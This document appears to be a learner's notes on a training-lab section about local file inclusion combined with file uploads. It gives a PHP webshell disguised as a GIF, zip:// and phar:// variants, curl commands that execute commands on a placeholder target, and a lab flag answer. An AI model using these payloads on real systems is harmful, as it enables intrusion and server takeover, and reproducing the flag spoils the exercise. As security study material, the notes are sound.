## ID
<!-- TODO: assign correct ID from your File Inclusion module range -->

## Module
File Inclusion

## Kind
notes

## Title
Section 7 — LFI and File Uploads

## Description
Achieving RCE by uploading a malicious file (disguised image or archive) to the server and then including it via an LFI vulnerability to execute embedded PHP code.

## Tags
lfi, rce, file-upload, php, webshell, phar, zip

## Commands
- echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
- echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
- php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
- curl -s 'http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=ls+/' | grep -v "<.*>"
- curl -s 'http://<TARGET>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id' | grep -v "<.*>"
- curl -s 'http://<TARGET>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id' | grep -v "<.*>"

## What This Section Covers
When a web app has both a file upload feature and an LFI vulnerability, you don't need the upload to be insecure — you just need it to accept your file. You embed PHP code inside a file that passes the upload checks (e.g. a GIF with magic bytes), then include it via LFI. Because the LFI function executes included PHP, your code runs regardless of the file extension. The zip:// and phar:// wrappers are fallback methods if direct inclusion is blocked.

## Methodology
1. **Create the malicious file** — embed PHP webshell inside a GIF using magic bytes so it passes content-type checks:
   `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
2. **Upload it** — use the app's normal upload feature (e.g. profile avatar). No exploit needed here.
3. **Find the uploaded file path** — inspect page source after upload; usually something like `/profile_images/shell.gif`.
4. **Include via LFI** — pass the path to the vulnerable parameter + `&cmd=<CMD>`:
   `?language=./profile_images/shell.gif&cmd=id`
5. **If direct inclusion is blocked**, try zip:// or phar:// wrappers (see commands above).
6. **Enumerate and read flag** — `cmd=ls+/` then `cmd=ls+/<suspicious_dir>` then `cmd=cat+/<flagfile>`.

## Multi-step Workflow

```bash
# Step 1 — create malicious GIF webshell
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# Step 2 — upload via browser to /settings.php (profile avatar)

# Step 3 — confirm execution + list /
curl -s 'http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=id' | grep -v "<.*>"
curl -s 'http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=ls+/' | grep -v "<.*>"

# Step 4 — dig into non-standard dirs
curl -s 'http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=ls+/<DIR>' | grep -v "<.*>"

# Step 5 — read the flag
curl -s 'http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=cat+/<FLAGFILE>' | grep -v "<.*>"

# --- Fallback: zip wrapper ---
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
# Upload shell.jpg, then:
curl -s 'http://<TARGET>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id' | grep -v "<.*>"

# --- Fallback: phar wrapper ---
# Write this to shell.php, then compile:
# <?php
# $phar = new Phar('shell.phar');
# $phar->startBuffering();
# $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
# $phar->setStub('<?php __HALT_COMPILER(); ?>');
# $phar->stopBuffering();
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
# Upload shell.jpg, then:
curl -s 'http://<TARGET>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id' | grep -v "<.*>"
```

## Three Methods Compared

| Method | File to upload | Wrapper | Reliability |
|---|---|---|---|
| Malicious image | `shell.gif` (GIF magic bytes) | None — direct path | ✅ Most reliable |
| Zip upload | `shell.jpg` (zip archive) | `zip://` | ⚠️ zip wrapper must be enabled |
| Phar upload | `shell.jpg` (phar archive) | `phar://` | ⚠️ phar wrapper must be enabled |

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Flag at `/` via upload + LFI | `HTB{upl04d+lf!+3x3cut3=rc3}` | Upload shell.gif → `./profile_images/shell.gif` → `ls /` showed `GIF82f40d...txt` (GIF8 is magic bytes prefix) → real file is `/2f40d853e2d4768d87da1c81772bae0a.txt` |

## Key Takeaways
- The upload form does NOT need to be vulnerable — it just needs to accept the file.
- GIF magic bytes (`GIF8`) are ASCII so they're the easiest to embed in a shell; other formats need binary magic bytes.
- The file extension is irrelevant — PHP executes whatever the `include()` function loads, extension or not.
- Always check the page source after uploading to get the exact uploaded file path.
- zip:// and phar:// are fallbacks; start with direct image inclusion — it works in most cases.

## Gotchas
- If the LFI has a directory prefix (e.g. `include("./languages/" . $_GET['language'])`), you need `../` to escape it before using the upload path.
- Some apps rename uploaded files (e.g. to a UUID) — inspect the page source carefully to get the real filename.
- `%23` is URL-encoded `#` (needed for zip://), and `%2F` is URL-encoded `/` (needed for phar://).
- When `ls /` shows a filename starting with `GIF8` (e.g. `GIF82f40d...txt`), the `GIF8` is your magic bytes bleeding into the output — the real filename starts after it (`2f40d...txt`).


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-inclusion]]  
← [[06-rfi]] | [[08-log-poisoning]] →
<!-- AUTO-LINKS-END -->
